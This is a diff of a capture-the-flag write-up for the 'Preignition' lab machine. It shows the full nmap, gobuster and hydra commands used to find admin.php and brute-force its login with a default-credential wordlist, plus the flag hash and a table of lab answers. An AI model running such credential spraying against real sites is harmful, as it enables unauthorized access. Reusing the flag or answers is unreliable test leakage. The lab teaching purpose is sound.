@@ -10,42 +10,33 @@
 
 ## Summary
 
-A web host running nginx. Directory busting reveals an `admin.php` page that
-accepts the default `admin:admin` login. The flag drops once we authenticate.
+A web host with a hidden `admin.php` page that accepts the `admin:admin`
+default. The trick is that the box is named "Preignition" because the work
+happens *before* the engine starts: dirbusting and credential spraying are
+the whole solve. There's no exploit, just enumeration done correctly.
 
 ## Recon
 
 ```bash
 nmap -sV -p 80 10.129.199.239
+# 80/tcp open  http    nginx 1.14.2
 ```
 
-```
-PORT   STATE SERVICE VERSION
-80/tcp open  http    nginx 1.14.2
-```
-
-## Enumeration
-
-Run `gobuster` against the root, looking for PHP pages:
+## Discovery
 
 ```bash
 gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://10.129.199.239 -x php
+# /admin.php  (Status: 200) [Size: 999]
 ```
 
-```
-/admin.php            (Status: 200) [Size: 999]
-```
+`admin.php` is a login form that posts `username` and `password` fields and
+returns the string "Wrong username or password" on failure. That error string
+is what we anchor `hydra` on.
 
-## Foothold
-
-Visiting `admin.php` shows a login form. The form posts username/password
-fields and returns "Wrong username or password" on failure, which gives us a
-clean error string for `hydra` to anchor on.
-
-Build a small wordlist of common defaults:
+## Spray
 
 ```bash
-cat << 'EOF' > wordlist.txt
+cat > wordlist.txt << 'EOF'
 admin:password
 root:root
 root:admin
@@ -53,22 +44,15 @@ user:user
 user:password
 admin:admin
 EOF
-```
 
-Brute-force with `hydra` using the combo list (`-C`):
-
-```bash
 hydra -C wordlist.txt 10.129.199.239 http-post-form \
   "/admin.php:username=^USER^&password=^PASS^:Wrong username or password"
+# [80][http-post-form] login: admin   password: admin
 ```
-
-```
-[80][http-post-form] host: 10.129.199.239   login: admin   password: admin
-```
-
-Logging in as `admin:admin` returns the flag in the page body.
 
 ## Flag
+
+Logging in as `admin:admin` returns the flag in the page body.
 
 ```
 6483bee07c1c1d57f14e5b0717503c73
@@ -90,4 +74,3 @@ Logging in as `admin:admin` returns the flag in the page body.
 | 6 | When using gobuster to dir bust, what switch do we add to make sure it finds PHP pages? | -x php |
 | 7 | What page is found during our dir busting activities? | admin.php |
 | 8 | What is the HTTP status code reported by Gobuster for the discovered page? | 200 |
-| Flag | Submit Root Flag | `6483bee07c1c1d57f14e5b0717503c73` |
